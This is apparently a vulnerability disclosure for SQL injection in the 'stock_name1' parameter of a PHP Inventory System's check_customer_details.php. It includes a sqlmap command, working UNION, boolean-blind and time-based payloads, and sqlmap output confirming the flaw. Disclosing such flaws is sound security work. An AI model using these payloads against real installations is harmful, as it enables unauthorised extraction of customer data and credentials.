# SQL Injection in Inventory System (Check Customer Details)

## Overview

* **Vulnerability Type**: SQL Injection (UNION-based / Blind)
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Check Customer Details (`check_customer_details.php`)
* **Vulnerable Parameter**: `stock_name1` (POST)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `check_customer_details.php` file.

The application fails to properly sanitize the `stock_name1` parameter in the HTTP POST request (likely triggered by an AJAX call when verifying customer details). This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL** and the injection point allows for **UNION queries**, attackers can directly retrieve and display sensitive data from the database, in addition to using blind injection techniques.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Exploit**: Send a crafted HTTP POST request to `check_customer_details.php` with the malicious payload, or use `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/check_customer_details.php" \
--data "stock_name1=Supplier+ABC" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**UNION Query Payload (MySQL):**

```sql
stock_name1=Supplier ABC' UNION ALL SELECT NULL,NULL,CONCAT(0x7178627671,0x716c4d586d496e52634477677944537343584b4e474c785575756b44755258414e586668424e4c50,0x716a6b6a71),NULL,NULL,NULL#

```

**Boolean-based Blind Payload:**

```sql
stock_name1=Supplier ABC' OR NOT 3787=3787#

```

**Time-based Blind Payload:**

```sql
stock_name1=Supplier ABC' AND (SELECT 7881 FROM (SELECT(SLEEP(5)))aHqc)-- zcja

```

## Proof of Concept

The following output from `sqlmap` confirms that the `stock_name1` parameter is vulnerable to UNION-based, Boolean-based, and Time-based SQL injection.

```text
Parameter: stock_name1 (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: stock_name1=Supplier ABC' OR NOT 3787=3787#
    Vector: OR NOT [INFERENCE]#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: stock_name1=Supplier ABC' AND (SELECT 7881 FROM (SELECT(SLEEP(5)))aHqc)-- zcja
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: stock_name1=Supplier ABC' UNION ALL SELECT NULL,NULL,CONCAT(0x7178627671,0x716c4d586d496e52634477677944537343584b4e474c785575756b44755258414e586668424e4c50,0x716a6b6a71),NULL,NULL,NULL#
    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL#
---
[INFO] the back-end DBMS is MySQL

```

<img width="1051" height="412" alt="图片" src="https://github.com/user-attachments/assets/a38673d5-872c-4780-a28e-b78347526fef" />


## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Directly retrieve and display database content (customer details, credentials) via UNION-based attacks.
2. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
